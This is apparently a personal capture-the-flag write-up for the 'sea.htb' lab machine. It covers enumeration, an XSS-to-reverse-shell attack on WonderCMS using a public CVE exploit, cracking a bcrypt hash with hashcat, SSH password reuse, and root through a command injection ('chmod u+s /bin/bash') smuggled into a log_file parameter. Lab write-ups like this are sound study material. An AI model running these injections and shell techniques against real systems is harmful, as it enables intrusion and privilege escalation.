




# Given
ip/scope: 10.10.11.28



# Steps

## Initial Enum
- nmap scan: `nmap -sCV -p- 10.10.11.28 -oN nmap.out`
- manual enumeration of the website to see if there are any exploitable areas like forms, links, etc. Got domain name, and the fact that contact works through php.
- add domain to `/etc/hosts`
- follow contact link to online contact form page.
	- contact form doesn't work, fails to send out anything.
- used feroxbuster to try and check for links/directories that aren't immediately apparent.
- Googled `turboblack 3.2.0 exploit`, and found a known vulnerability (CVE-2023-41425) which seems to reference an XSS vulnerability.
- Googled a bit for the default login for wondercms, and got:
	- `http://sea.htb/loginURL/index.php?page=loginURL`


## Vulnerability Found
- Used exploit found here: `https://github.com/thefizzyfish/CVE-2023-41425-wonderCMS_RCE`
- XSS can be used to have the victim download a file from you, and through that establish a reverse shell.


## Initial Foothold
- exploit works by creating a python server on the attacking machine, and having the victim download a js file called `xss.js`.
- Attacker run a `netcat listener`, which will be pinged when the victim's machine downloads the `xss.js` file.

### Upgrading the Shell
```bash
# In reverse shell
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z

# In Kali
$ stty raw -echo
$ fg

# In reverse shell
$ reset
$ export SHELL=bash
$ export TERM=xterm-256color
$ stty rows <num> columns <cols>
```


## Privilege Escalation Part 1
- Looking around the files in the web server, there will be a file called `database.js` which contains a password hash for the CMS.
	- The password hash encrypted with the BCRYPT algorithm
	- There are escape characters in the hash which have to be taken out before decrypting it.
- Use Hashcat to crack the hash
	- `hashcat -m 3200 ./findings/hash.txt /usr/share/wordlists/rockyou.txt`
	- password is `mychemicalromance`
- Checked for repeated password use by trying to SSH into each user's account. 
	- amay's account can be accessed with the same password
	- User flag is found in Amay's home directory.


## Privilege Escalation part 2

### Enumerating the Server
- Tried using the following on the system, and there weren't much avenues to priv esc"
	- `sudo -l`
	- `find / -type f -perm -4000 -o -perm -6000 2>/dev/null`
- Checked for any port activity on the machine, and found 2 possible ports running on the loopback interface of the machine
	- `netstat -tulpen`
- One of them gives an unauthorized error when you curl to it:
	- `curl 127.0.0.1:39665`
- The other port (8080) doesn't give any error.
- We can't seem to enumerate what's on 8080 easily, so we use port forwarding
	- `ssh amay@10.10.14.28 -L 8080:127.0.0.1:8080`
- Checking this port out on a browser gives us a monitoring website that's running on the same port in the pivot machine. 
- The monitoring site allows users to analyze log files by selecting them from a dropdown and pressing the Analyze button.
- Analyze the POST request made to the server using `burpsuite` and notice that it is trying to call a log file, where the path is given as part of the request's parameters.
	- We can potentially change this to view whatever file we want to.


### Root Shell
- We can also try to inject a command into the `log_file` property in order to perhaps elevate ourself (amay) to root.
	- `chmod u+s /bin/bash`
- We can url encode the spaces, and add this to the parameter:
	- `log_file=;chmod+u%2Bs+/bin/bash&analyze_log=`
- This should work when the POST request is sent. 
- We can then ssh in as amay, and look at the permissions of the `/bin/bash` binary, and it should have the SUID enabled.
- Launch the bash terminal with the `-p` flag to enable privileged mode and NOT inherit shell functions from the environment
	- `/bin/bash -p`
-



# Findings
- nmap scan: 
	- open ports: ssh(22), http(80)
	- OS: Linux
- website contact form works on a php file.
- website contact link also has domain name of box, which is `sea.htb`
- most files were off limits, except for:

```bash
200      GET        1l        1w        6c http://sea.htb/themes/bike/version
200      GET       21l      168w     1067c http://sea.htb/themes/bike/LICENSE
200      GET        1l        9w       66c http://sea.htb/themes/bike/summary
```

- Going into LICENSE, and Summary gives you a theme name and version `turboblack 3.2.0`
- Found exploit that uses xss to create a reverse shell on the site
- Found hashed CMS login password
- Found 2 users:
	- amay
	- geo
- Found open port in web server on tcp 8080.
- LFI on monitoringsite that's open on port 8080. Allows you to access binaries, and escalate privileges



# Creds
Creds for privesc/lateral movement
- cms login hash: `$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ\/D.GuE4jRIikYiWrD3TM\/PjDnXm4q`
	- Note the escape characters in the hash above
- `$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q:mychemicalromance`



# Flags
- User: 5ef514189276ffb34d7c702441e763f8
- Root: 2b877443cea9411a76939528ee117502
